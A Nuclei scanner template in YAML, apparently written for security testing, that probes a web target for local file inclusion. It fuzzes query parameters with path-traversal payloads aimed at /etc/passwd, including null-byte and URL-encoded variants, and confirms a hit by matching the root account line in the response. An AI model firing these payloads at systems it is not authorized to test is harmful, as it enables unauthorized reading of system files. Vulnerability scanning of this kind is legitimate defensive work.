id: Nawab_Lfi 📂
info:
  name: 📂 Nawab-Confirmed-LFI 📂
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      lfi_payloads:
        - "/etc/passwd"
        - "../../../../../etc/passwd"
        - "../../../../../etc/passwd%00"
        - "..%2f..%2f..%2f..%2fetc%2fpasswd"
        - "/../../../../../../../../etc/passwd"
    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{lfi_payloads}}"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:x:0:0:[^:]+:[^:]+:[^:]+"
    extractors:
      - type: kval
        name: FOUND_PAYLOAD
        kval:
          - lfi_payloads
